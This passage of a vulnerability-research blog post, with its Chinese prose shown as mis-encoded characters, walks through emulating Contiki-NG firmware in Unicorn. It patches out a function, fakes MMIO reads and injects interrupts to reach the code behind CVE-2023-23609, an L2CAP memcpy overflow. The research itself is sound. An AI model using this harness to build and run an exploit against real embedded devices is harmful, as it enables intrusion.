</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">.text:00210924 ; void __fastcall fade(leds_mask_t l)
.text:00210924 fade                                    ; CODE XREF: platform_init_stage_two+3C‚Üëp
.text:00210924                                         ; platform_init_stage_three+20‚Üëp ...
.text:00210924
.text:00210924 i               = -0x14
.text:00210924
.text:00210924 l = R0                                  ; leds_mask_t
.text:00210924                 PUSH    {R4-R6,LR}
.text:00210926                 SUB     SP, SP, #8

...

.text:0021097C                 ADD     SP, SP, #8
.text:0021097E                 POP     {R4-R6,PC}
</code></pre></td></tr></table>
</div>
</div><p>ÈÇ£‰πàÂæàËá™ÁÑ∂ÁöÑÔºåÊàë‰ª¨Êää 0x210926 Â§ÑÁöÑ‰ª£Á†ÅÁõ¥Êé•‰øÆÊîπ‰∏∫ <code>POP {R4-R6,PC}</code> Âç≥ÂèØ„ÄÇ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">mu</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="mh">0x210926</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x70\xBD</span><span class="s2">&#34;</span><span class="p">)</span> <span class="c1"># bypass fade, POP {R4-R6,PC}</span>
</code></pre></td></tr></table>
</div>
</div><p>Ëß£ÂÜ≥‰∏ç‰∫ÜÈóÆÈ¢òÔºåÂ∞±Ê∂àÁÅ≠ÊèêÂá∫ÈóÆÈ¢òÁöÑ‰∫∫ÔºÅ</p>
<h4 id="Ê®°ÊãüÁ®ãÂ∫èÂπ∂‰∫ßÁîü‰∏Ä‰∏™-reset-‰∏≠Êñ≠">Ê®°ÊãüÁ®ãÂ∫èÔºåÂπ∂‰∫ßÁîü‰∏Ä‰∏™ reset ‰∏≠Êñ≠</h4>
<p>Êàë‰ª¨ÂÖàÊ®°ÊãüÊâßË°åÂà∞ 0x210768 Â§Ñ„ÄÇÊÄùË∑ØÂ∑≤ÁªèÂçÅÂàÜÊ∏ÖÊô∞‰∫ÜÔºåÁõ¥Êé•‰∏äÁ†Å„ÄÇ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span><span class="lnt">89
</span><span class="lnt">90
</span><span class="lnt">91
</span><span class="lnt">92
</span><span class="lnt">93
</span><span class="lnt">94
</span><span class="lnt">95
</span><span class="lnt">96
</span><span class="lnt">97
</span><span class="lnt">98
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">unicorn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">unicorn.arm_const</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>

<span class="kn">import</span> <span class="nn">random</span>

<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;arm&#39;</span>

<span class="n">REGION_START</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">REGION_SIZE</span> <span class="o">=</span> <span class="mh">0x60000000</span>
<span class="n">ROM_BASE</span> <span class="o">=</span> <span class="mh">0x202000</span>

<span class="k">def</span> <span class="nf">hook_code</span><span class="p">(</span><span class="n">mu</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">user_data</span><span class="p">):</span>        
    <span class="k">pass</span>

<span class="n">interrupted</span> <span class="o">=</span> <span class="kc">False</span>

<span class="k">def</span> <span class="nf">hook_block</span><span class="p">(</span><span class="n">mu</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">access</span><span class="p">,</span> <span class="n">user_data</span><span class="p">):</span>
    <span class="k">global</span> <span class="n">interrupted</span>

    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[hook block] 0x</span><span class="si">{</span><span class="n">address</span><span class="si">:</span><span class="s2">x</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">access</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">user_data</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

    <span class="c1"># interrupt </span>
    <span class="k">if</span> <span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="mh">0x203D5A</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">interrupted</span><span class="p">):</span>

        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Interrupted...&#34;</span><span class="p">)</span>
        <span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
        <span class="n">interrupted</span> <span class="o">=</span> <span class="kc">True</span>

        <span class="c1"># save registers</span>
        <span class="n">ptrs</span> <span class="o">=</span> <span class="p">{}</span>
        <span class="k">for</span> <span class="n">reg</span> <span class="ow">in</span> <span class="n">regs</span><span class="p">:</span>
            <span class="n">ptrs</span><span class="p">[</span><span class="n">reg</span><span class="p">]</span> <span class="o">=</span> <span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">reg</span><span class="p">)</span>
        <span class="n">pc</span> <span class="o">=</span> <span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_PC</span><span class="p">)</span>
            
        <span class="c1"># execute functions</span>
        <span class="n">interrupt_no</span> <span class="o">=</span> <span class="mi">2</span> <span class="c1"># reset</span>
        <span class="n">interrupt_func</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">mu</span><span class="o">.</span><span class="n">mem_read</span><span class="p">(</span><span class="n">ROM_BASE</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">*</span> <span class="p">(</span><span class="n">interrupt_no</span> <span class="o">-</span> <span class="mi">1</span><span class="p">),</span> <span class="mi">4</span><span class="p">))</span>
        <span class="n">mu</span><span class="o">.</span><span class="n">emu_start</span><span class="p">(</span><span class="n">interrupt_func</span><span class="p">,</span> <span class="mh">0x00210768</span><span class="p">)</span>

        <span class="n">exit</span><span class="p">()</span>

        <span class="c1"># restore</span>
        <span class="k">for</span> <span class="n">reg</span> <span class="ow">in</span> <span class="n">regs</span><span class="p">:</span>
            <span class="n">mu</span><span class="o">.</span><span class="n">reg_write</span><span class="p">(</span><span class="n">reg</span><span class="p">,</span> <span class="n">ptrs</span><span class="p">[</span><span class="n">reg</span><span class="p">])</span>    <span class="c1"># how to deal with stack?</span>
        <span class="n">mu</span><span class="o">.</span><span class="n">reg_write</span><span class="p">(</span><span class="n">UC_ARM_REG_PC</span><span class="p">,</span> <span class="n">pc</span><span class="o">+</span><span class="mi">2</span><span class="p">)</span>


    <span class="k">pass</span>
    

<span class="k">def</span> <span class="nf">hook_mem_unmapped</span><span class="p">(</span><span class="n">mu</span><span class="p">,</span> <span class="n">access</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">user_data</span><span class="p">):</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[hook_mem_unmapped] </span><span class="si">{</span><span class="n">access</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">address</span><span class="si">:</span><span class="s2">x</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">length</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">value</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">user_data</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
    <span class="k">pass</span>


<span class="k">def</span> <span class="nf">hook_mem_read</span><span class="p">(</span><span class="n">mu</span><span class="p">,</span> <span class="n">access</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">user_data</span><span class="p">):</span>
    <span class="c1"># print(f&#34;[hook_mem_read] {access}, {address:x}, {length}, {value}, {user_data}&#34;)</span>
    <span class="k">if</span> <span class="n">length</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x4000000</span><span class="p">])</span>   <span class="c1"># to bypass sys_ctrl_init, random_init</span>
        <span class="c1"># print(f&#34;content: {mu.mem_read(address, 4)}, ready to write random: {r}&#34;)</span>
        <span class="n">mu</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">p32</span><span class="p">(</span><span class="n">r</span><span class="p">))</span>


<span class="n">regs</span> <span class="o">=</span> <span class="p">[</span><span class="n">UC_ARM_REG_SP</span><span class="p">,</span> <span class="n">UC_ARM_REG_R0</span><span class="p">,</span> <span class="n">UC_ARM_REG_R1</span><span class="p">,</span> <span class="n">UC_ARM_REG_R2</span><span class="p">,</span> <span class="n">UC_ARM_REG_R3</span><span class="p">,</span> <span class="n">UC_ARM_REG_R12</span><span class="p">,</span> <span class="n">UC_ARM_REG_LR</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">mu</span> <span class="o">=</span> <span class="n">Uc</span><span class="p">(</span><span class="n">UC_ARCH_ARM</span><span class="p">,</span> <span class="n">UC_MODE_THUMB</span><span class="p">)</span>

    <span class="c1"># memory regions</span>
    <span class="n">mu</span><span class="o">.</span><span class="n">mem_map</span><span class="p">(</span><span class="n">REGION_START</span><span class="p">,</span> <span class="n">REGION_SIZE</span><span class="p">)</span>
    <span class="n">mu</span><span class="o">.</span><span class="n">mem_map</span><span class="p">(</span><span class="mh">0xe0000000</span><span class="p">,</span> <span class="mh">0x10000000</span><span class="p">)</span> <span class="c1"># NVIC</span>

    <span class="c1"># load ROM</span>
    <span class="n">mu</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">ROM_BASE</span><span class="p">,</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;hello-world.bin&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>

    <span class="c1"># write memory / patch code</span>
    <span class="n">mu</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="mh">0x210926</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x70\xBD</span><span class="s2">&#34;</span><span class="p">)</span> <span class="c1"># bypass fade, POP {R4-R6,PC}</span>
    <span class="c1"># why not push pc, or mov pc,lr</span>

    <span class="c1"># init SP</span>
    <span class="n">init_sp</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">mu</span><span class="o">.</span><span class="n">mem_read</span><span class="p">(</span><span class="n">ROM_BASE</span><span class="p">,</span> <span class="mi">4</span><span class="p">))</span>
    <span class="n">reset</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">mu</span><span class="o">.</span><span class="n">mem_read</span><span class="p">(</span><span class="n">ROM_BASE</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">4</span><span class="p">))</span>
    <span class="n">mu</span><span class="o">.</span><span class="n">reg_write</span><span class="p">(</span><span class="n">UC_ARM_REG_SP</span><span class="p">,</span> <span class="n">init_sp</span><span class="p">)</span>
    
    <span class="c1"># hooks</span>
    <span class="n">mu</span><span class="o">.</span><span class="n">hook_add</span><span class="p">(</span><span class="n">UC_HOOK_CODE</span><span class="p">,</span> <span class="n">hook_code</span><span class="p">)</span>
    <span class="n">mu</span><span class="o">.</span><span class="n">hook_add</span><span class="p">(</span><span class="n">UC_HOOK_BLOCK</span><span class="p">,</span> <span class="n">hook_block</span><span class="p">)</span>
    <span class="n">mu</span><span class="o">.</span><span class="n">hook_add</span><span class="p">(</span><span class="n">UC_HOOK_MEM_UNMAPPED</span><span class="p">,</span> <span class="n">hook_mem_unmapped</span><span class="p">)</span>
    <span class="n">mu</span><span class="o">.</span><span class="n">hook_add</span><span class="p">(</span><span class="n">UC_HOOK_MEM_READ</span><span class="p">,</span> <span class="n">hook_mem_read</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="mh">0x40000000</span><span class="p">,</span> <span class="mh">0x60000000</span><span class="p">)</span> <span class="c1"># MMIO read</span>

    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;reset:</span><span class="si">{</span><span class="n">reset</span><span class="si">:</span><span class="s2">x</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

    <span class="n">mu</span><span class="o">.</span><span class="n">emu_start</span><span class="p">(</span><span class="n">reset</span><span class="p">,</span> <span class="mh">0x00210768</span><span class="p">)</span>

<span class="n">main</span><span class="p">()</span>

</code></pre></td></tr></table>
</div>
</div><p>ÂÅöÂá†ÁÇπËØ¥ÊòéÔºö</p>
<ol>
<li>
<p>ÂâçÈù¢ÊèêÂà∞ ARM Boot ÁöÑÊó∂ÂÄô‰ªé 0 Âú∞ÂùÄÂ§ÑËØª SP Âíå reset_handlerÔºåÈÇ£ÊòØÁúüÊ≠£ÁöÑÁ°¨‰ª∂Â§ÑÁêÜÊµÅÁ®ã„ÄÇËΩØ‰ª∂Ê®°ÊãüÊó∂ÔºåÁõ¥Êé•Êää raw Âä†ËΩΩÂà∞ÂéüÊú¨ÁöÑÂú∞ÂùÄÂ§ÑÔºåËá≥‰∫é SP Âíå reset_handler Áõ¥Êé•‰ªéËøô‰∏™Âú∞ÂùÄÂ§ÑËØªÂ∞±Ë°å‰∫Ü„ÄÇ</p>
</li>
<li>
<p>hook_code ÊòØÊØîËæÉÂ•ΩÁöÑË∞ÉËØïÊâãÊÆµÔºåÈÄöËøáÊâìÂç∞‰ø°ÊÅØÂèØ‰ª•ÁúãÂà∞Ê®°ÊãüËøáÁ®ã„ÄÇ</p>
</li>
<li>
<p>Áî±‰∫éÊúâ‰∏ÄÈÉ®ÂàÜ‰ª£Á†Å‰ºöÂæ™ÁéØÁ≠âÂæÖÁ°¨‰ª∂ÁöÑÂÄºÔºåÊâÄ‰ª•Ë¶Å‰πàÊääÈÇ£ÈÉ®ÂàÜ‰ª£Á†Å patch ÊéâÔºåË¶Å‰πà hook_mem_read Êù•ÊîπÂèò MMIOÔºàÁõ∏ÂΩì‰∫é‰ªéÁ°¨‰ª∂ËæìÂÖ•ÂÄºÔºâ„ÄÇ</p>
</li>
<li>
<p>‰∏≠Êñ≠Âú® hook_block ‰∏≠ÂºïÂÖ•„ÄÇÁî±‰∫éÊ®°ÊãüÁöÑÊòØ resetÔºå‰∏∫‰∫ÜÈÅøÂÖç‰∏ÄÁõ¥Âæ™ÁéØÊâßË°åÊàë‰ª¨Âè™ÂºïÂÖ•‰∏ÄÊ¨°‰∏≠Êñ≠„ÄÇÊâÄ‰ª•Êï¥‰∏™ÊÉ≥Ë¶ÅÊ®°ÊãüÁöÑËøáÁ®ãÊòØËøôÊ†∑ÁöÑÔºöboot -&gt; reset_handler -&gt; main -&gt; ‰∏≠Êñ≠ -&gt; reset_handler -&gt; main -&gt; Ê®°ÊãüÁªìÊùü exit„ÄÇÂèØ‰ª•Âà©Áî® hook_code ÊâìÂç∞Âú∞ÂùÄ‰ø°ÊÅØÁúãÁúãÊ®°ÊãüÁöÑÊòØ‰∏çÊòØËøô‰∏™ËøáÁ®ã„ÄÇ</p>
</li>
</ol>
<h4 id="Ëß¶ÂèëÊõ¥Â§ö‰∏≠Êñ≠Â§çÁé∞-cve-2023-23609">Ëß¶ÂèëÊõ¥Â§ö‰∏≠Êñ≠ÔºåÂ§çÁé∞ CVE-2023-23609</h4>
<p>‰∏ãÈù¢Êàë‰ª¨Êù•ÂÅöÁÇπÊõ¥ÊúâÊÑèÊÄùÁöÑ‰∫ãÊÉÖÔºöÊ®°ÊãüÊõ¥Â§öÁöÑ‰∏≠Êñ≠Êù•ÊâßË°åÂà∞ <a href="https://github.com/contiki-ng/contiki-ng/security/advisories/GHSA-qr4q-6h3m-h3g7" target="_blank" rel="noopener noreffer">CVE-2023-23609</a> ÁöÑÊºèÊ¥û‰ª£Á†ÅÔºåÂπ∂ÊûÑÈÄ†‰∏≠Êñ≠Êï∞ÊçÆÂ§çÁé∞ÊºèÊ¥û„ÄÇÂèØ‰ª•ÁúãÂà∞ÊºèÊ¥û patch Âá∫Áé∞Âú® <code>input_l2cap_frame_flow_channel</code> ‰∏≠ÔºåÂ§ßÊ¶ÇÊòØÁº∫Â∞ë‰∏Ä‰∏™ÈïøÂ∫¶Ê£ÄÊµãÔºåÂØºËá¥Á¥ßÊé•ÁùÄÁöÑ memcpy Âá∫Áé∞Ë∂äÁïå„ÄÇÊü•Áúã binary ‰∏≠Ëøô‰∏™ÊºèÊ¥ûÂáΩÊï∞ÂèëÁé∞Á°ÆÂÆûÊ≤°ÊúâË¢´ patch„ÄÇ</p>
<h6 id="Â¶Ç‰ΩïËµ∞Âà∞ÊºèÊ¥ûÂáΩÊï∞">Â¶Ç‰ΩïËµ∞Âà∞ÊºèÊ¥ûÂáΩÊï∞</h6>
<p>Â§ßÊ¶ÇÁåúÊµãËøôÊòØ‰∏Ä‰∏™ÁΩëÁªúÂåÖÂ§ÑÁêÜÂáΩÊï∞ÔºåÊâÄ‰ª•Êàë‰ª¨ÂæóËøõ‰∏ÄÊ≠•ÂàÜÊûêÁΩëÂç°Áõ∏ÂÖ≥ÂáΩÊï∞„ÄÇ‰∏≠Êñ≠Ë°®‰∏≠ÁöÑ <code>pka_isr</code> Âíå <code>cc2538_rf_rx_tx_isr</code> Áúã‰∏äÂéªÁõ∏ÂΩìÁõ∏ÂÖ≥„ÄÇ</p>
<p><code>cc2538_rf_rx_tx_isr</code> Áúã‰∏äÂéªÊòØ poll ‰∏Ä‰∏™ËøõÁ®ãÁÑ∂Âêé‰øÆÊîπÂØÑÂ≠òÂô®„ÄÇËøô‰∏™ËøõÁ®ãÁöÑÂÖ•Âè£ÁÇπÂú® <code>process_thread_cc2538_rf_process</code>ÔºåËøô‰∏™ÂáΩÊï∞Áúã‰∏äÂéªÂ∞±ÊòØ‰∏™Êî∂ÂåÖÂáΩÊï∞ÔºåÊé•Êî∂Âà∞Á°¨‰ª∂‰º†Êù•ÁöÑÂåÖ‰ª•ÂêéÔºåÁªèËøá‰∏ÄÁ≥ªÂàóÁöÑÊ†°È™åÂπ∂Ë∞ÉÁî® <code>input</code> ÂáΩÊï∞ÔºåËÄå <code>input</code> Â∞±ËÉΩËß¶ÂèëÊºèÊ¥ûÂáΩÊï∞„ÄÇ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">cc2538_rf_rx_tx_isr</span><span class="p">()</span>
<span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">poll_mode</span> <span class="p">)</span>
    <span class="n">process_poll</span><span class="p">(</span><span class="o">&amp;</span><span class="n">cc2538_rf_process</span><span class="p">);</span>
  <span class="n">MEMORY</span><span class="p">[</span><span class="mh">0x40088834</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>Â•ΩÔºåÊâÄ‰ª•Êé•‰∏ãÊù•Êàë‰ª¨Â∞ùËØïËß¶Âèë‰∏≠Êñ≠ÂáΩÊï∞ <code>cc2538_rf_rx_tx_isr</code>Ôºå‰∏≠Êñ≠Âè∑ 158. Ê≥®ÂÖ•‰∏≠Êñ≠ÁöÑ‰ª£Á†ÅÂü∫Êú¨ÂèØ‰ª•ÁÖßÊê¨‰∏äÈÉ®ÂàÜÔºåÂæàÊòæÁÑ∂‰∏≠Êñ≠ÊÅ¢Â§ç<a href="https://developer.arm.com/documentation/ddi0403/d/System-Level-Architecture/System-Level-Programmers--Model/ARMv7-M-exception-model/Exception-entry-behavior" target="_blank" rel="noopener noreffer">ÁªÜËäÇ</a>ÂæàÂ§öÔºåËøúËøúÊØîËøôÊÆµ‰ª£Á†ÅÁÆÄÂçïÔºå‰ΩÜÊòØÁõÆÂâçÊöÇÊó∂ËÉΩÁî®Â∞±Ë°å„ÄÇ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">hook_block</span><span class="p">(</span><span class="n">mu</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">access</span><span class="p">,</span> <span class="n">user_data</span><span class="p">):</span>
  <span class="k">global</span> <span class="n">interrupted</span>

  <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[hook block] 0x</span><span class="si">{</span><span class="n">address</span><span class="si">:</span><span class="s2">x</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">access</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">user_data</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

  <span class="c1"># interrupt </span>
  <span class="k">if</span> <span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="mh">0x203D5A</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">interrupted</span><span class="p">):</span>

      <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Interrupted...&#34;</span><span class="p">)</span>
      <span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
      <span class="c1"># interrupted = True</span>
      <span class="n">interrupted</span> <span class="o">=</span> <span class="kc">True</span>

      <span class="c1"># save registers</span>
      <span class="n">ptrs</span> <span class="o">=</span> <span class="p">{}</span>
      <span class="k">for</span> <span class="n">reg</span> <span class="ow">in</span> <span class="n">regs</span><span class="p">:</span>
          <span class="n">ptrs</span><span class="p">[</span><span class="n">reg</span><span class="p">]</span> <span class="o">=</span> <span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">reg</span><span class="p">)</span>
      <span class="n">pc</span> <span class="o">=</span> <span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_PC</span><span class="p">)</span>
          
      <span class="c1"># execute functions</span>
      <span class="n">interrupt_no</span> <span class="o">=</span> <span class="mi">158</span>
      <span class="n">interrupt_func</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">mu</span><span class="o">.</span><span class="n">mem_read</span><span class="p">(</span><span class="n">ROM_BASE</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">*</span> <span class="p">(</span><span class="n">interrupt_no</span> <span class="o">-</span> <span class="mi">1</span><span class="p">),</span> <span class="mi">4</span><span class="p">))</span>
      <span class="n">mu</span><span class="o">.</span><span class="n">emu_start</span><span class="p">(</span><span class="n">interrupt_func</span><span class="p">,</span> <span class="mh">0x203B1C</span><span class="p">)</span>

      <span class="c1"># restore</span>
      <span class="k">for</span> <span class="n">reg</span> <span class="ow">in</span> <span class="n">regs</span><span class="p">:</span>
          <span class="n">mu</span><span class="o">.</span><span class="n">reg_write</span><span class="p">(</span><span class="n">reg</span><span class="p">,</span> <span class="n">ptrs</span><span class="p">[</span><span class="n">reg</span><span class="p">])</span>    <span class="c1"># how to deal with stack?</span>
      <span class="c1"># mu.reg_write(UC_ARM_REG_PC, pc)</span>

      <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;ok&#34;</span><span class="p">)</span>

      <span class="c1"># mu.emu_start(0x203D5A, 0x00210768)</span>

      <span class="n">exit</span><span class="p">()</span>

  <span class="k">pass</span>
</code></pre></td></tr></table>
</div>
</div><p>ÁÑ∂ÂêéÂèëÁé∞Â∞±ÂèØ‰ª•Ëµ∞Âà∞ <code>cc2538_rf_rx_tx_isr</code> ÂáΩÊï∞‰∫ÜÔºåÂπ∂Ëß¶Âèë‰∫Ü‰ªé MMIO ËØªÂèñÁΩëÂç°Êï∞ÊçÆÂåÖÁöÑ <code>read</code> ÂáΩÊï∞„ÄÇÊàë‰ª¨ÊåâÁÖß MMIO pattern Â∞±ÂèØ‰ª•ÊûÑÈÄ†ÁΩëÁªúÂåÖ‰∫ÜÔºöÂÖàÂêë 0x40088828 Âú∞ÂùÄÂ§ÑÂ°û 4 Â≠óËäÇË°®Á§∫ÈïøÂ∫¶ÔºåÁÑ∂ÂêéÊØèÊ¨°Âêë 0x40088828 Âú∞ÂùÄÂ§ÑÂ°û<strong>‰∏Ä‰∏™</strong>Â≠óËäÇ‰Ωú‰∏∫Êï∞ÊçÆ„ÄÇËøôÈáå‰πüÂèØ‰ª•ÂèëÁé∞ <code>bufsize</code> ÂÆöÊ≠ª‰∏∫ 0x80Ôºå‰∏∫Êàë‰ª¨ÂêéÁª≠ÁöÑÂà©Áî®Â¢ûÊ∑ª‰∫Ü‰∏çÂ∞ëÈ∫ªÁÉ¶„ÄÇ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="kr">__fastcall</span> <span class="nf">read</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kr">__int16</span> <span class="n">bufsize</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// r0
</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// r3
